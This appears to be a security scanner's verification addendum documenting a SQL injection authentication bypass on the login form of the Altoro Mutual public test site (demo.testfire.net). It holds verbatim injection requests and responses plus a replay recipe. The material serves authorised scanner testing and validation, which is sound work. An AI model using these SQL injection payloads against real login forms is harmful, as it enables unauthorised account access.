# SENTINEL v4.2.2 — INDEPENDENT VERIFICATION ADDENDUM (doLogin, demo.testfire.net)

Generated 2026-10-03 from the v4.2.2 re-scan of demo.testfire.net. ADDENDUM to
the frozen INDEPENDENT_VERIFICATION_PACKAGES.md (171 cases, engine v4.2.1) —
that file is untouched; this file documents the supervisor-ordered engine fix
(SQLi numeric-comment battery family, DETECT-06) and the live re-scan that
closes the recorded doLogin coverage gap.

## What this file is — and what it is NOT
- Same rules as the main package: raw engine records, raw request/response
  pairs verbatim from the scan's request journal, NO human or external
  judgment applied. The generator only formats; it never evaluates.
- The target's behavior CHANGED between scans (documented below with three
  timestamped probe sets). This file records what the target did DURING this
  scan, and what it did in earlier windows, without adjudication.

---
# TARGET: http://demo.testfire.net  (testfire) — v4.2.2 re-scan

Authorization basis: IBM/Akamai public demo application (Altoro Mutual), provided for security testing.

Scan record (as-run, unedited):
- run_id: run-6a6418ab8d | seed: 55136a9e | scanner: sentinel-core/4.2.2
- profile: identical to the frozen v4.2.1 scan (no-oast, no-browser, max-pages 10)
- requests: 396 | duration: 185.46s | journal: 396 entries | dropped: 0
- engine verdict tally (as-is): 37 findings / 0 rejected / 0 unverified
- delta vs the frozen v4.2.1 scan (run-6a6418ab8d, 36 findings): +1 finding —
  sql_injection @ POST /doLogin (parameter `uid`), the previously-missed
  auth-bypass. Same seed, same profile.

### Target-state flap — three timestamped windows (facts, no adjudication)
1. v4.2.1 scan window (~00:58 UTC, frozen package): the engine's string-quote
   family did NOT fire; journal entry #7 hit a transport timeout. 36 findings,
   no doLogin SQLi.
2. Manual probe window (~01:30 UTC, recorded in the frozen package, labeled
   NOT engine output): `uid=1' OR '1'='1' --` -> 302 login.jsp (dead) while
   `uid=' OR 1=1--` -> 302 /bank/main.jsp (alive). The numeric-comment family
   was absent from the battery — the honest coverage gap.
3. Pre-fix verification window (03:45 UTC, manual probes by the engineering
   agent, NOT engine output): `uid=1' OR 1=1--` -> 302 /bank/main.jsp AND
   `uid=1' OR '1'='1' -- ` -> 302 /bank/main.jsp — BOTH families alive again
   (the target flaps between states).
4. This scan (v4.2.2): BOTH families fired on doLogin (raw pairs below).

## [TESTFIRE ADDENDUM F01] sql_injection — critical (engine verdict: verified)

- Surface: POST http://demo.testfire.net/doLogin (parameter: `uid`)
- Engine verdict: verified via `oracle:or-redirect-2round` | confidence 0.95 | rounds 2
- Verification notes (engine-recorded): replay OR TRUE -> http://demo.testfire.net/bank/main.jsp, FALSE -> http://demo.testfire.net/login.jsp
- Impact (engine-assessed): proven — Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; t...
- Evidence chain (engine-recorded):
    * [redirect_diff] OR-tautology redirect differential: TRUE -> http://demo.testfire.net/bank/main.jsp, FALSE -> http://demo.testfire.net/login.jsp — auth-bypass oracle
    * [redirect_diff] numeric-OR redirect differential: TRUE -> http://demo.testfire.net/bank/main.jsp, FALSE -> http://demo.testfire.net/login.jsp — auth-bypass oracle

- RAW reproduction (from the scan's request journal, verbatim):

  ### detection pair — string-quote family (DETECT-01)
  --- RAW REQUEST req-4c27ce9b (exactly as issued by the engine) ---
  POST /doLogin
  headers:
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.2; +security-scanner)
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
  body:
    uid=1%27+OR+%271%27%3D%271%27+--+&passw=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    server: Apache-Coyote/1.1
    content-type: text/html;charset=ISO-8859-1
    content-length: 7377
    date: Sat, 03 Oct 2026 04:14:45 GMT
  redirect_chain: [[302, 'http://demo.testfire.net/bank/main.jsp']]
  body (first 400 chars, control bytes escaped \xNN):
    \n\n \n    \n\n \n\n<!-- BEGIN HEADER -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n\n<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >\n\n\n\n<head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />\n  <link href="/style.css" rel="stylesheet" type="text/css" />\n</he
  elapsed_ms: None
  --- RAW REQUEST req-efd7019d (exactly as issued by the engine) ---
  POST /doLogin
  headers:
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.2; +security-scanner)
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]; [REDACTED]
  body:
    uid=1%27+OR+%271%27%3D%272%27+--+&passw=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    server: Apache-Coyote/1.1
    content-type: text/html;charset=ISO-8859-1
    transfer-encoding: chunked
    date: Sat, 03 Oct 2026 04:14:46 GMT
  redirect_chain: [[302, 'http://demo.testfire.net/login.jsp']]
  body (first 400 chars, control bytes escaped \xNN):
    \n\n \n    \n\n \n\n<!-- BEGIN HEADER -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n\n<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >\n\n\n\n<head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />\n  <link href="/style.css" rel="stylesheet" type="text/css" />\n</he
  elapsed_ms: None

  ### detection pair — numeric-comment family (DETECT-06, NEW in v4.2.2)
  --- RAW REQUEST req-c88bbda7 (exactly as issued by the engine) ---
  POST /doLogin
  headers:
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.2; +security-scanner)
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]; [REDACTED]
  body:
    uid=1%27+OR+1%3D1--&passw=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    server: Apache-Coyote/1.1
    content-type: text/html;charset=ISO-8859-1
    content-length: 7377
    date: Sat, 03 Oct 2026 04:14:47 GMT
  redirect_chain: [[302, 'http://demo.testfire.net/bank/main.jsp']]
  body (first 400 chars, control bytes escaped \xNN):
    \n\n \n    \n\n \n\n<!-- BEGIN HEADER -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n\n<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >\n\n\n\n<head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />\n  <link href="/style.css" rel="stylesheet" type="text/css" />\n</he
  elapsed_ms: None
  --- RAW REQUEST req-4e8584a3 (exactly as issued by the engine) ---
  POST /doLogin
  headers:
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.2; +security-scanner)
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]; [REDACTED]
  body:
    uid=1%27+OR+1%3D2--&passw=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    server: Apache-Coyote/1.1
    content-type: text/html;charset=ISO-8859-1
    transfer-encoding: chunked
    date: Sat, 03 Oct 2026 04:14:48 GMT
  redirect_chain: [[302, 'http://demo.testfire.net/login.jsp']]
  body (first 400 chars, control bytes escaped \xNN):
    \n\n \n    \n\n \n\n<!-- BEGIN HEADER -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n\n<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >\n\n\n\n<head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />\n  <link href="/style.css" rel="stylesheet" type="text/css" />\n</he
  elapsed_ms: None

  ### verifier PATH C replay — fresh string-quote OR pair
  --- RAW REQUEST req-461a25e4 (exactly as issued by the engine) ---
  POST /doLogin
  headers:
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.2; +security-scanner)
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]; [REDACTED]
  body:
    uid=1%27+OR+%271%27%3D%271%27+--+&passw=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    server: Apache-Coyote/1.1
    content-type: text/html;charset=ISO-8859-1
    content-length: 7377
    date: Sat, 03 Oct 2026 04:14:51 GMT
  redirect_chain: [[302, 'http://demo.testfire.net/bank/main.jsp']]
  body (first 400 chars, control bytes escaped \xNN):
    \n\n \n    \n\n \n\n<!-- BEGIN HEADER -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n\n<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >\n\n\n\n<head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />\n  <link href="/style.css" rel="stylesheet" type="text/css" />\n</he
  elapsed_ms: None
  --- RAW REQUEST req-09dcf9f1 (exactly as issued by the engine) ---
  POST /doLogin
  headers:
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.2; +security-scanner)
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]; [REDACTED]
  body:
    uid=1%27+OR+%271%27%3D%272%27+--+&passw=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    server: Apache-Coyote/1.1
    content-type: text/html;charset=ISO-8859-1
    transfer-encoding: chunked
    date: Sat, 03 Oct 2026 04:14:52 GMT
  redirect_chain: [[302, 'http://demo.testfire.net/login.jsp']]
  body (first 400 chars, control bytes escaped \xNN):
    \n\n \n    \n\n \n\n<!-- BEGIN HEADER -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n\n<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >\n\n\n\n<head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />\n  <link href="/style.css" rel="stylesheet" type="text/css" />\n</he
  elapsed_ms: None

  ### verifier PATH D replay — fresh comparison pair (attempted first, no body-diff on redirects)
  --- RAW REQUEST req-04cfa9cb (exactly as issued by the engine) ---
  POST /doLogin
  headers:
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.2; +security-scanner)
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]; [REDACTED]
  body:
    uid=1%27+OR+%272%27%3E%271%27+--+&passw=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    server: Apache-Coyote/1.1
    content-type: text/html;charset=ISO-8859-1
    content-length: 7377
    date: Sat, 03 Oct 2026 04:14:50 GMT
  redirect_chain: [[302, 'http://demo.testfire.net/bank/main.jsp']]
  body (first 400 chars, control bytes escaped \xNN):
    \n\n \n    \n\n \n\n<!-- BEGIN HEADER -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n\n<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >\n\n\n\n<head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />\n  <link href="/style.css" rel="stylesheet" type="text/css" />\n</he
  elapsed_ms: None
  --- RAW REQUEST req-fea46a85 (exactly as issued by the engine) ---
  POST /doLogin
  headers:
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.2; +security-scanner)
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]; [REDACTED]
  body:
    uid=1%27+OR+%271%27%3E%272%27+--+&passw=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    server: Apache-Coyote/1.1
    content-type: text/html;charset=ISO-8859-1
    transfer-encoding: chunked
    date: Sat, 03 Oct 2026 04:14:51 GMT
  redirect_chain: [[302, 'http://demo.testfire.net/login.jsp']]
  body (first 400 chars, control bytes escaped \xNN):
    \n\n \n    \n\n \n\n<!-- BEGIN HEADER -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n\n<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >\n\n\n\n<head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />\n  <link href="/style.css" rel="stylesheet" type="text/css" />\n</he
  elapsed_ms: None

- Negative controls visible in the same journal (raw, unedited):
  - the `passw` parameter received the SAME battery (54 doLogin requests total,
    27 per parameter) and produced NO differential on any family — no finding.
  - the XSS/traversal/redirect/SSTI batteries on both doLogin parameters
    produced no reflection/differential — no finding.
- Evidence-OS reproduction recipe:
    1. POST http://demo.testfire.net/doLogin with `uid=1' OR 1=1--&passw=x`
       expect: 302 -> http://demo.testfire.net/bank/main.jsp (bypass)
    2. POST http://demo.testfire.net/doLogin with `uid=1' OR 1=2--&passw=x`
       expect: 302 -> http://demo.testfire.net/login.jsp (FALSE control)
    3. NOTE the target flaps (window 2 above killed the string-quote family
       while window 3 revived it); replay both families before concluding.

### Engine-level discrimination proof (recorded, not asserted)
- scripts/probe_numeric_family.py runs the DRIFTED-state simulation (string
  family dead, numeric family alive — the live-caught window-2 state) through
  BOTH engines: frozen v4.2.1 -> NO candidate ("engine honestly reports
  nothing"); v4.2.2 -> candidate + VERIFIED via oracle:ornum-2round.
  Raw records: build-v422/results/probe_numeric_family.jsonl
- unit_v422_sqli_numeric_comment_family (in the 104/104 suite) asserts the
  full chain on the same simulation.

### Gates for this engine change (v4.2.2)
- tests 104/104 (103 prior + 1 new discriminating case) | doctor 15/15
- bench x3 DETERMINISTIC: 38/0/0/37, F1 1.000, run-3c0652b6be — the numeric
  family added +106 requests and ZERO verdict changes on the fixture (zero
  noise). The stock-bench blindness warning stands: this proves no
  REGRESSION, not general correctness.

### Honest limits of this addendum
- The verification method that carried THIS run was PATH C (string-quote
  replay) because the target flapped back to accepting both families; the
  numeric family contributed the second detection differential (raw pair
  above) and is proven live-capable at window 2 + unit/mechanism level, but
  its PATH C' verifier replay did not need to fire in this scan.
- All verdicts remain engine-self-judged; this addendum exists so an external
  party can adjudicate by replaying the raw requests as issued.

## Package totals (this addendum)
- findings documented: 1 (doLogin sql_injection) + reference to the 37-finding
  raw scan JSON at build-v422/results/live_v422/testfire.json
- generated by scripts/build_addendum_v422.py — formatting only, no evaluation.
